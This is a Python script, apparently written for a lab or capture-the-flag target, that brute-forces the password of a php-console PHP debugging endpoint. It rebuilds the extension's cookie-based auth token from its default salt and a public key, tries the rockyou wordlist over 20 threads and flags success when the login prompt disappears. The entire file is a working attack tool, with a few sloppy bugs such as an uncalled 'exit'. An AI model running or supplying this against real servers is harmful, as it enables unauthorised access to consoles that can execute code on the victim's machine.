import httpx
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor

class Bruteforcer():

	def __init__(self):
		self.filter = "Make sure to load php-console in order to be prompted for a password"

		self.salt = "NeverChangeIt:)"

		self.host = "http://LALALALALALAL/"

		self.params = '{{"php-console-client":5,"auth":{{"publicKey":"{}","token":"{}"}}}}'
		self.public_key = "d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e"

		self.wordlist = "/usr/share/wordlists/rockyou.txt"
		
		self.cookie = "php-console-server=5; php-console-client={}"

		self.total = 0
		self.current_total = 0
		
		self.threadpool = ThreadPoolExecutor(max_workers=20)

	def process_wordlist(self):
		print("Calculating wordlist size...", end='\r')
		with open(self.wordlist, encoding="utf8", errors="surrogateescape") as file:
			for line in file:
				self.total += 1

		print("The wordlist contains {} words.\n".format(self.total))

	def encode_request(self, password):
		salt = self.salt
		public_key = self.public_key
		params = self.params
		
		pass_hash = hashlib.sha256((password + salt).encode()).hexdigest()
		auth_token = hashlib.sha256((pass_hash + public_key).encode()).hexdigest()
		encoded_params = (base64.b64encode((params.format(public_key, auth_token)).encode())).decode()
		return encoded_params
		
		
	def make_request(self, password):
		#print("Avant : " + str(self.current_total))
		#async with self.counter_lock:
		self.current_total += 1
		#print("Après : " + str(self.current_total))
		print("{}% - Trying : {}                            ".format(round((self.current_total / self.total) * 100, 2), password), end='\r')
		encoded_params = self.encode_request(password)
		headers = {"Cookie": self.cookie.format(encoded_params)}
		req = httpx.get(self.host, headers=headers)
		if req.status_code == 200:
			body = req.text
			if self.filter not in body:
				print("Passwourd found ! : {}".format(password))
				exit
		
	def bruteforce(self):
		with open(self.wordlist, encoding="utf8", errors="surrogateescape") as file:
			for password in file:
				self.threadpool.submit(self.make_request, password.strip())
				#await self.make_request(password.strip())
			print("\nNo password worked.")
			exit

	def run(self):
		self.process_wordlist()
		self.bruteforce()
		

Bruteforce = Bruteforcer()
Bruteforce.run()
